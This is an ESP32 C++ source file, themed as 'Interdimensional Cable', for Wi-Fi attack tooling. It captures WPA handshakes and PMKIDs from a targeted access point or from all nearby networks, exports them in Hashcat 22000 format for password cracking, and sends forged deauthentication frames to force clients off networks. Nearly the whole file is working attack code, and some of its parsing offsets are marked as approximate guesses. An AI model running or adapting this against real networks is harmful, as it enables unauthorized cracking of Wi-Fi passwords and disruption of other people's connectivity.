/**
 * @file handshake_capture.cpp
 * @brief Handshake & PMKID Capture - Interdimensional Cable Mode
 *
 * "There's literally everything on interdimensional cable, Morty"
 */

#include "handshake_capture.h"
#include <esp_wifi.h>
#include <SD.h>

// =============================================================================
// INITIALIZATION
// =============================================================================
bool capture_init(capture_state_t* state, uint16_t max_handshakes, uint16_t max_pmkids) {
    state->handshakes = (handshake_t*)ps_malloc(sizeof(handshake_t) * max_handshakes);
    state->pmkids = (pmkid_t*)ps_malloc(sizeof(pmkid_t) * max_pmkids);

    if (!state->handshakes || !state->pmkids) {
        Serial.println("[CAPTURE] Failed to allocate buffers");
        return false;
    }

    state->handshakeCount = 0;
    state->handshakeCapacity = max_handshakes;
    state->pmkidCount = 0;
    state->pmkidCapacity = max_pmkids;
    state->hasTarget = false;
    state->isCapturing = false;
    state->captureStartTime = 0;

    Serial.println("[CAPTURE] Interdimensional Cable initialized");
    return true;
}

// =============================================================================
// START/STOP CAPTURE
// =============================================================================
void capture_start_target(capture_state_t* state, const uint8_t* bssid, const char* ssid) {
    memcpy(state->targetBSSID, bssid, 6);
    state->hasTarget = true;
    state->isCapturing = true;
    state->captureStartTime = millis();

    Serial.printf("[CAPTURE] Targeting: %s [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                  ssid,
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

void capture_start_all(capture_state_t* state) {
    state->hasTarget = false;
    state->isCapturing = true;
    state->captureStartTime = millis();

    Serial.println("[CAPTURE] Capturing all interdimensional signals...");
}

void capture_stop(capture_state_t* state) {
    state->isCapturing = false;

    Serial.printf("[CAPTURE] Stopped. Handshakes: %d, PMKIDs: %d\n",
                  state->handshakeCount, state->pmkidCount);
}

// =============================================================================
// EAPOL PROCESSING
// =============================================================================
void capture_process_eapol(capture_state_t* state, const uint8_t* packet, uint16_t len) {
    if (!state->isCapturing) return;
    if (len < sizeof(eapol_key_t) + 14) return;  // Min Ethernet + EAPOL

    // Parse 802.11 header to get addresses
    const uint8_t* bssid = packet + 16;  // Address 3 in data frame
    const uint8_t* station = packet + 10;  // Address 2 (source)

    // Check if targeting specific BSSID
    if (state->hasTarget && memcmp(bssid, state->targetBSSID, 6) != 0) {
        return;
    }

    // Find or create handshake entry
    handshake_t* hs = nullptr;
    for (uint16_t i = 0; i < state->handshakeCount; i++) {
        if (memcmp(state->handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(state->handshakes[i].station, station, 6) == 0) {
            hs = &state->handshakes[i];
            break;
        }
    }

    if (!hs && state->handshakeCount < state->handshakeCapacity) {
        hs = &state->handshakes[state->handshakeCount];
        memcpy(hs->bssid, bssid, 6);
        memcpy(hs->station, station, 6);
        hs->hasFrame1 = false;
        hs->hasFrame2 = false;
        hs->hasFrame3 = false;
        hs->hasFrame4 = false;
        hs->complete = false;
        hs->captureTime = millis();
        state->handshakeCount++;
    }

    if (!hs) return;

    // Parse EAPOL key frame
    // Skip 802.11 header + LLC/SNAP (8 bytes) to get to EAPOL
    const uint8_t* eapol = packet + 32;  // Approximate offset
    const eapol_key_t* key = (const eapol_key_t*)eapol;

    uint16_t keyInfo = ntohs(key->key_info);
    bool isKeyAck = (keyInfo & 0x0080) != 0;
    bool isMic = (keyInfo & 0x0100) != 0;
    bool isSecure = (keyInfo & 0x0200) != 0;
    bool isInstall = (keyInfo & 0x0040) != 0;

    // Determine which frame (1-4)
    if (isKeyAck && !isMic && !isInstall) {
        // Frame 1: ANonce
        memcpy(hs->anonce, key->key_nonce, 32);
        hs->hasFrame1 = true;
        Serial.println("[CAPTURE] EAPOL Frame 1 (ANonce)");
    }
    else if (!isKeyAck && isMic && !isInstall) {
        // Frame 2: SNonce + MIC
        memcpy(hs->snonce, key->key_nonce, 32);
        memcpy(hs->mic, key->key_mic, 16);
        hs->keyver = keyInfo & 0x0007;

        // Save EAPOL frame for hash
        uint16_t eapolLen = ntohs(key->length) + 4;
        if (eapolLen <= sizeof(hs->eapol)) {
            memcpy(hs->eapol, eapol, eapolLen);
            hs->eapolLen = eapolLen;
        }

        hs->hasFrame2 = true;
        Serial.println("[CAPTURE] EAPOL Frame 2 (SNonce + MIC)");
    }
    else if (isKeyAck && isMic && isInstall) {
        // Frame 3
        hs->hasFrame3 = true;
        Serial.println("[CAPTURE] EAPOL Frame 3");
    }
    else if (!isKeyAck && isMic && isSecure) {
        // Frame 4
        hs->hasFrame4 = true;
        Serial.println("[CAPTURE] EAPOL Frame 4");
    }

    // Check if complete (need at least frames 1+2 or 2+3)
    if ((hs->hasFrame1 && hs->hasFrame2) || (hs->hasFrame2 && hs->hasFrame3)) {
        if (!hs->complete) {
            hs->complete = true;
            Serial.printf("\n[CAPTURE] HANDSHAKE CAPTURED for %02X:%02X:%02X:%02X:%02X:%02X!\n",
                          hs->bssid[0], hs->bssid[1], hs->bssid[2],
                          hs->bssid[3], hs->bssid[4], hs->bssid[5]);
        }
    }
}

// =============================================================================
// PMKID EXTRACTION
// =============================================================================
void capture_process_beacon(capture_state_t* state, const uint8_t* packet, uint16_t len) {
    if (!state->isCapturing) return;

    // Parse 802.11 beacon frame for RSN IE with PMKID
    const uint8_t* bssid = packet + 16;  // BSSID in beacon

    // Check if targeting
    if (state->hasTarget && memcmp(bssid, state->targetBSSID, 6) != 0) {
        return;
    }

    // Search for RSN IE (tag 48)
    const uint8_t* ie = packet + 36;  // After fixed beacon params
    const uint8_t* end = packet + len;

    while (ie < end - 2) {
        uint8_t tagNum = ie[0];
        uint8_t tagLen = ie[1];

        if (tagNum == 48 && tagLen >= 22) {  // RSN IE
            // Look for PMKID in RSN IE
            const uint8_t* rsn = ie + 2;
            uint16_t rsnLen = tagLen;

            // Parse RSN IE to find PMKID list
            // Structure: Version(2) + Group(4) + Pairwise Count(2) + Pairwise Suites...
            // + AKM Count(2) + AKM Suites... + RSN Caps(2) + PMKID Count(2) + PMKIDs

            if (rsnLen > 20) {
                // Check for PMKID at end of RSN IE
                const uint8_t* pmkidList = rsn + rsnLen - 18;  // Approximate

                // PMKID is 16 bytes
                if (state->pmkidCount < state->pmkidCapacity) {
                    pmkid_t* pmkid = &state->pmkids[state->pmkidCount];
                    memcpy(pmkid->bssid, bssid, 6);
                    memcpy(pmkid->pmkid, pmkidList, 16);
                    pmkid->captureTime = millis();
                    state->pmkidCount++;

                    Serial.printf("\n[CAPTURE] PMKID EXTRACTED for %02X:%02X:%02X:%02X:%02X:%02X!\n",
                                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                }
            }
        }

        ie += 2 + tagLen;
    }
}

// =============================================================================
// FILE EXPORT
// =============================================================================
bool capture_save_handshake(handshake_t* handshake, const char* filename) {
    File file = SD.open(filename, FILE_WRITE);
    if (!file) return false;

    // Hashcat 22000 format:
    // WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
    // WPA*02*MIC*MAC_AP*MAC_STA*ESSID*NONCE_AP*EAPOL*MESSAGEPAIR

    char line[512];
    snprintf(line, sizeof(line),
             "WPA*02*%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*"
             "%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%s*",
             handshake->mic[0], handshake->mic[1], handshake->mic[2], handshake->mic[3],
             handshake->mic[4], handshake->mic[5], handshake->mic[6], handshake->mic[7],
             handshake->mic[8], handshake->mic[9], handshake->mic[10], handshake->mic[11],
             handshake->mic[12], handshake->mic[13], handshake->mic[14], handshake->mic[15],
             handshake->bssid[0], handshake->bssid[1], handshake->bssid[2],
             handshake->bssid[3], handshake->bssid[4], handshake->bssid[5],
             handshake->station[0], handshake->station[1], handshake->station[2],
             handshake->station[3], handshake->station[4], handshake->station[5],
             handshake->ssid);

    // Add ANonce
    for (int i = 0; i < 32; i++) {
        char hex[3];
        snprintf(hex, sizeof(hex), "%02x", handshake->anonce[i]);
        strcat(line, hex);
    }
    strcat(line, "*");

    // Add EAPOL (hex encoded)
    for (int i = 0; i < handshake->eapolLen; i++) {
        char hex[3];
        snprintf(hex, sizeof(hex), "%02x", handshake->eapol[i]);
        strcat(line, hex);
    }
    strcat(line, "*02\n");  // Message pair

    file.print(line);
    file.close();

    Serial.printf("[CAPTURE] Saved handshake to %s\n", filename);
    return true;
}

bool capture_save_pmkid(pmkid_t* pmkid, const char* filename) {
    File file = SD.open(filename, FILE_APPEND);
    if (!file) return false;

    // Hashcat 22000 format for PMKID:
    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***
    char line[256];
    snprintf(line, sizeof(line),
             "WPA*01*%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*"
             "%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%s***\n",
             pmkid->pmkid[0], pmkid->pmkid[1], pmkid->pmkid[2], pmkid->pmkid[3],
             pmkid->pmkid[4], pmkid->pmkid[5], pmkid->pmkid[6], pmkid->pmkid[7],
             pmkid->pmkid[8], pmkid->pmkid[9], pmkid->pmkid[10], pmkid->pmkid[11],
             pmkid->pmkid[12], pmkid->pmkid[13], pmkid->pmkid[14], pmkid->pmkid[15],
             pmkid->bssid[0], pmkid->bssid[1], pmkid->bssid[2],
             pmkid->bssid[3], pmkid->bssid[4], pmkid->bssid[5],
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Client MAC (unknown for PMKID)
             pmkid->ssid);

    file.print(line);
    file.close();

    Serial.printf("[CAPTURE] Saved PMKID to %s\n", filename);
    return true;
}

bool capture_save_all(capture_state_t* state) {
    char filename[64];

    // Save all handshakes
    for (uint16_t i = 0; i < state->handshakeCount; i++) {
        if (state->handshakes[i].complete) {
            snprintf(filename, sizeof(filename), "%s/hs_%02x%02x%02x%02x.22000",
                     DIR_HANDSHAKES,
                     state->handshakes[i].bssid[2], state->handshakes[i].bssid[3],
                     state->handshakes[i].bssid[4], state->handshakes[i].bssid[5]);
            capture_save_handshake(&state->handshakes[i], filename);
        }
    }

    // Save all PMKIDs
    snprintf(filename, sizeof(filename), "%s/pmkids.22000", DIR_PMKID);
    for (uint16_t i = 0; i < state->pmkidCount; i++) {
        capture_save_pmkid(&state->pmkids[i], filename);
    }

    return true;
}

// =============================================================================
// GETTERS
// =============================================================================
bool capture_is_complete(handshake_t* handshake) {
    return handshake->complete;
}

uint16_t capture_handshake_count(capture_state_t* state) {
    return state->handshakeCount;
}

uint16_t capture_pmkid_count(capture_state_t* state) {
    return state->pmkidCount;
}

void capture_clear(capture_state_t* state) {
    state->handshakeCount = 0;
    state->pmkidCount = 0;
    Serial.println("[CAPTURE] Capture buffers cleared");
}

// =============================================================================
// DEAUTHENTICATION
// =============================================================================
void deauth_send(const uint8_t* bssid, const uint8_t* station, uint8_t reason, uint8_t count) {
    // Deauth frame structure
    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                         // Frame control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast or station)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x01, 0x00                          // Reason code
    };

    // Set addresses
    if (station) {
        memcpy(&deauthFrame[4], station, 6);
    }
    memcpy(&deauthFrame[10], bssid, 6);
    memcpy(&deauthFrame[16], bssid, 6);
    deauthFrame[24] = reason;

    // Send multiple frames
    for (uint8_t i = 0; i < count; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
        delayMicroseconds(500);
    }

    Serial.printf("[DEAUTH] Sent %d frames to %02X:%02X:%02X:%02X:%02X:%02X\n",
                  count, station ? station[0] : 0xFF, station ? station[1] : 0xFF,
                  station ? station[2] : 0xFF, station ? station[3] : 0xFF,
                  station ? station[4] : 0xFF, station ? station[5] : 0xFF);
}

void deauth_broadcast(const uint8_t* bssid, uint8_t reason, uint8_t count) {
    deauth_send(bssid, nullptr, reason, count);
}

void deauth_all_clients(const uint8_t* bssid, uint8_t reason, uint8_t count) {
    deauth_broadcast(bssid, reason, count);
}
